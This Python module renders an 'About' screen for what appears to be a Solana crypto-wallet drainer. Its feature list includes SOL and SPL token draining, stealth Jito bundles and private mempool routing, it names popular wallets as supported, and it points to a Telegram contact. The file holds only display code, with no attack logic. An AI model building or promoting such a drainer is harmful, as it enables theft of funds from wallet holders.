# -*- coding: utf-8 -*-
"""About action — Features, supported wallets, contact"""

from rich.table import Table
from rich.panel import Panel
from rich.rule import Rule
from rich import box
from modules.ui import console


def action_about():
    console.print()
    console.print(Rule("[bold green]ABOUT[/]", style="green"))

    features_table = Table(show_header=True, header_style="bold green", border_style="dim", box=box.SIMPLE)
    features_table.add_column("Feature", style="green")
    features_table.add_column("Status", justify="center")
    for feat in [
        "Multi-wallet sweeping",
        "SOL & SPL token draining",
        "Real-time balance monitoring",
        "Stealth Jito bundle transactions",
        "Phantom/Backpack/Solflare support",
        "Auto-confirm transactions",
        "Custom priority fees",
        "Minimum balance threshold",
        "Private mempool routing",
        "Multi-RPC failover",
        "Telegram notifications",
        "Cross-platform support",
    ]:
        features_table.add_row(feat, "[green]+[/]")

    wallets_table = Table(show_header=True, header_style="bold green", border_style="dim", box=box.SIMPLE)
    wallets_table.add_column("Wallet", style="green")
    wallets_table.add_column("Support", justify="center")
    for w in ["Phantom", "Backpack", "Solflare", "Glow", "Trust Wallet", "Exodus"]:
        wallets_table.add_row(w, "[green]Full[/]")

    contact_table = Table(show_header=True, header_style="bold green", border_style="dim", box=box.SIMPLE)
    contact_table.add_column("Channel", style="green")
    contact_table.add_column("Value", style="cyan")
    contact_table.add_row("Telegram", "JOIN OUR TELEGRAM CHAT")
    contact_table.add_row("SOL Address", "DRaiN...abc123")
    contact_table.add_row("Support", "GitHub Issues or Telegram")

    console.print(Panel(features_table, title="[bold] Features [/]", border_style="green", box=box.ROUNDED))
    console.print()
    console.print(Panel(wallets_table, title="[bold] Supported Wallets [/]", border_style="green", box=box.ROUNDED))
    console.print()
    console.print(Panel(contact_table, title="[bold] Contact [/]", border_style="green", box=box.ROUNDED))
    console.print()
    console.print("[bold green]Contribution:[/] Don't forget to put stars *")
    console.print("[dim]Python 3.10+. Questions? Contact via Telegram or Issues.[/]")
    console.print()
